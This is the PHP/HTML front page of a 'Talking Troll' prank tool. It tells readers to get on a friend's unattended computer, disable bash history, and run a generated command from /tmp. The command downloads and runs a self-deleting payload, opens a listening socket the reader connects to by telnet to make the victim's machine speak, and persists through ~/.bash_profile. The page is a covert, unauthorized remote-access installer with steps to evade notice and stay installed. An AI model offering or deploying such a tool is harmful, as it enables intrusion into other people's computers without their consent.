<?php
require_once '../inc/config.inc';
?>

<!doctype html>
<html lang="es">
    <head>
        <meta charset="utf-8" />

        <title>The Talking Troll</title>

        <link rel="stylesheet" type="text/css" href="css/reset.css" />
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
        <link rel="stylesheet" type="text/css" href="css/bootstrap-theme.min.css" />
        <link rel="stylesheet" type="text/css" href="css/site.css" />
    </head>

    <body>
        <header>
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <h1>The Talking Troll</h1>
                    </div>
                </div>
            </div>
        </header>

        <section class="main">
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <div class="msgs">

                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <form method="post">
                            <div class="form-group">
                                <label class="sr-only" for="email">Email address</label>
                                <input id="email" type="email" class="form-control" placeholder="Email" />
                            </div>
                            <button type="submit" class="btn btn-success form-control">Generate</button>
                        </form>
                    </div>
                </div>
                <div class="row result">
                    <div class="col-xs-12">
                        <input id="cmd" type="text" class="form-control" placeholder="Command" />
                        <button class="btn btn-primary form-control select-ctrl" select-target="#cmd">Select Command</button>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <div class="instructions">
                            <h2>Instructions:</h2>
                            <ol>
                                <li>Hop on your buddies computer when they're not looking</li>
                                <li>Navigate a web browser (incognito if you want to hide traffic) to <a href="<?php echo SERVER_HOST; ?>"><?php echo SERVER_HOST; ?></a></li>
                                <li>Enter <strong>your</strong> email and click "Generate"</li>
                                <li>Select &amp; copy the command given</li>
                                <li>Open the Terminal (open a new tab if Terminal is already running)</li>
                                <li>
                                    Disable bash history:
                                    <pre> $ unset HISTFILE</pre>
                                </li>
                                <li>
                                    Use the tmp directory:
                                    <pre> $ cd /tmp</pre>
                                </li>
                                <li>
                                    Paste your command and run! (Hit "ENTER"):
                                    <pre id="instructions-cmd"> $ <?php echo parse_file_contents('cmd', 'XXXXXXXXXXXXXXXX', true); ?></pre>
                                </li>
                                <li>
                                    Close the terminal window opened by you
                                    <p class="extra">The email you used to generate the installer will be notified once the SS portal has successfully opened</p>
                                </li>
                                <li>
                                    With IP and Port specified in the notification email, connect using telnet
                                    <pre> $ telnet [IP ADDRESS] [PORT]</pre>
                                    This will look something like this:
                                    <pre> $ telnet 192.168.1.100 12345</pre>
                                </li>
                                <li>
                                    If your connection is successful, you should see this welcome message along with the say prompt:
<pre>Welcome to the Say Socket!
Type anything to say it through the socket.
To quit, type 'quit'. To shut down the server type 'shutdown'.
say> </pre>
                                </li>
                                <li>
                                    Now anything you type will be spoken by their computer!
                                    <p class="extra">Except special characters and existing shell commands</p>
                                </li>
                                <li>
                                    <h3>Are they confused and muting their sound?<br />Good thing it comes with a volume override!</h3>
                                    Instead of entering something silly for their computer to say, use the custom "volume" command
                                    <p class="extra">The "volume" command will accept integer [0-9] as the volume level</p>
                                    <pre> say> volume 9</pre>
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <footer>
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <p>USE AT YOUR OWN RISK!</p>
                        <p>No rm or delete commands exist within this script (with the exception of the command above which removes itself after downloading and running).</p>
                        <p>Only applicable within a simple local network setting (without complex port forwarding)</p>
                        <p>This will append a line to ~/.bash_profile so it restarts with each new terminal session</p>
                    </div>
                </div>
            </div>
        </footer>

        <script type="text/javascript" src="js/jquery.min.js"></script>
        <script type="text/javascript" src="js/bootstrap.min.js"></script>
        <script type="text/javascript" src="js/site.js"></script>
    </body>
</html>
